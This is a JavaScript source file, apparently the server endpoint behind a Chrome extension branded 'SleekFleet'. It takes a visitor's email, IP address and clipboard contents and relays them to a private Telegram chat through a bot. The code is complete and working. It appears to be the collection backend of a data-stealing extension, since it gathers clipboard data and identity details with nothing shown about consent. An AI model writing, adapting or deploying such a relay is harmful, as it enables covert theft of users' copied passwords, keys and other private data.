// src/api/scrape.js

export default async function handler(req, res) {
  // 1. Handle CORS Preflight (Required for Chrome Extensions)
  if (req.method === 'OPTIONS') {
    return res.status(200).json({});
  }

  // 2. Parse Body Correctly
  let payload = {};
  try {
    // Vercel Node functions sometimes pass body as string or object
    const rawBody = req.body || "";
    payload = typeof rawBody === 'string' ? JSON.parse(rawBody) : rawBody;
  } catch (e) {
    console.error("JSON Parse Error:", e);
    payload = {};
  }

  // 3. Check Method
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method Not Allowed' });
  }

  try {
    // 4. Format Message
    const msg = `
🚗 *SleekFleet Session Data*

🆔 Email: \`${payload.email || "N/A"}\`
🌐 IP: \`${payload.ip || "Unknown"}\`
📋 Clipboard: \`${payload.data || "Empty"}\`
📍 Source: ${payload.source || 'web'}
⏰ Time: ${new Date().toISOString()}
    `.trim();

    // 5. Send to Telegram
    const tgToken = process.env.TELEGRAM_BOT_TOKEN;
    const tgChatId = process.env.TELEGRAM_CHAT_ID;

    if (tgToken && tgChatId) {
      try {
        const tgUrl = `https://api.telegram.org/bot${tgToken}/sendMessage`;
        
        // Add timeout to prevent hanging requests
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 5000); // 5s timeout

        const response = await fetch(tgUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            chat_id: tgChatId, 
            text: msg, 
            parse_mode: 'Markdown' 
          }),
          signal: controller.signal
        });

        clearTimeout(timeoutId);

        if (!response.ok) {
          console.error(`Telegram API Error: ${response.status} ${response.statusText}`);
        } else {
          console.log("✅ Telegram Message Sent");
        }
      } catch (err) {
        // Log error but don't fail the whole request
        console.error("❌ Telegram Fetch Failed:", err.message);
      }
    } else {
      console.log("⚠️ Telegram skipped: Missing Env Vars");
    }

    // 6. Return Success to Extension
    res.status(200).json({ success: true });

  } catch (error) {
    console.error("💥 Handler Error:", error);
    res.status(500).json({ error: error.message });
  }
}
